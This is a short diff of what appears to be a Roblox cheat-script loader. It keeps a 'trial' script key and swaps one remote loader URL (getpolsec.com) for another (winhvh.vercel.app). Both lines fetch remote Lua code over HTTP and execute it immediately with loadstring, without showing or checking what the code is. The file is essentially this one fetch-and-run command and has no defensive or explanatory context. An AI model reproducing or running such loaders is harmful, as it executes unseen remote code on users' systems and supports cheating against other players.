@@ -1,3 +1,2 @@
 script_key = "trial"
-
-loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/8e6a498d177e0bc062d6c4b1aa14f97890dd98a49ac3c777b9290e5526ef1689.lua"))()
+loadstring(game:HttpGet("https://winhvh.vercel.app/loader/96353fc54a436da3e37637385631757e"))()
